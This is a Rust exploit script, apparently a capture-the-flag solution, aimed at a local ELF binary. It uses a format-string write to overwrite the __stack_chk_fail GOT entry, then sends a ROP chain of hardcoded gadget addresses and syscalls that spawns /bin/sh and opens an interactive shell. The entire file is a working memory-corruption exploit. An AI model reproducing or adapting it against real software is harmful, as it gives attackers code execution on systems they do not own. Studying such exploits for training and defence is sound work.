use clap::Clap;
use pwntools::{process::Process, pwn::*};
use std::{
    io,
    ops::{AddAssign, Mul},
    time, usize,
};

#[derive(Clap)]
struct Opts {
    elf_file: String,
}

#[derive(Debug, Clone, Default)]
struct Payload {
    data: Vec<u8>,
}

impl AddAssign<P64> for Payload {
    fn add_assign(&mut self, rhs: P64) {
        self.data.extend_from_slice(&rhs.0.to_le_bytes())
    }
}

impl AddAssign<&[u8]> for Payload {
    fn add_assign(&mut self, rhs: &[u8]) {
        self.data.extend_from_slice(rhs)
    }
}

impl AddAssign<Vec<u8>> for Payload {
    fn add_assign(&mut self, rhs: Vec<u8>) {
        self.data.extend_from_slice(&rhs)
    }
}

impl Mul<usize> for P64 {
    type Output = Vec<u8>;

    fn mul(self, rhs: usize) -> Self::Output {
        self.0.to_le_bytes().repeat(rhs)
    }
}

impl Payload {
    pub fn ljust(&mut self, size: usize, value: u8) {
        self.data.resize(size, value)
    }

    pub fn as_bytes(&self) -> &[u8] {
        &self.data
    }
}

struct P64(u64);

fn main() -> io::Result<()> {
    let opts: Opts = Opts::parse();

    let mut conn = Process::new(&opts.elf_file)?;

    let pwn = Pwn::new(&opts.elf_file);

    let ret = 0x401256_u64;
    let pop_rdi = 0x4012c3_u64;
    let pop_rsi_r15 = 0x4012c1_u64;
    let syscall = 0x40118f_u64;

    let mut payload = Payload::default();
    payload += &b"%8$d%1$s"[..];
    payload.ljust(0x10, b'\0');
    payload += P64(pwn.got("__stack_chk_fail").unwrap());

    conn.sendline(payload.as_bytes())?;
    std::thread::sleep(time::Duration::from_millis(100));

    conn.sendline(&format!("{}", ret).as_bytes())?;
    std::thread::sleep(time::Duration::from_millis(100));

    let mut payload = Payload::default();
    payload.ljust(0x11, b'A');
    payload += P64(pop_rdi);
    payload += P64(pwn.bss().unwrap());
    payload += P64(pop_rsi_r15);
    payload += P64(0x21);
    payload += P64(0);
    payload += P64(pwn.symbol("readn").unwrap());
    payload += P64(syscall);
    payload += P64(0) * 0xd;
    payload += P64(pwn.bss().unwrap());
    payload += P64(0) * 0x4;
    payload += P64(0x3b);
    payload += P64(0);
    payload += P64(pwn.bss().unwrap() + 0x200);
    payload += P64(syscall);
    payload += P64(0);
    payload += P64(0x33);
    payload += P64(0) * 5;

    conn.sendline(payload.as_bytes())?;
    std::thread::sleep(time::Duration::from_millis(100));

    conn.send(&format!("{}{:A<24}\x0f", "/bin/sh\0", "").as_bytes())?;
    conn.interactive()?;

    Ok(())
}
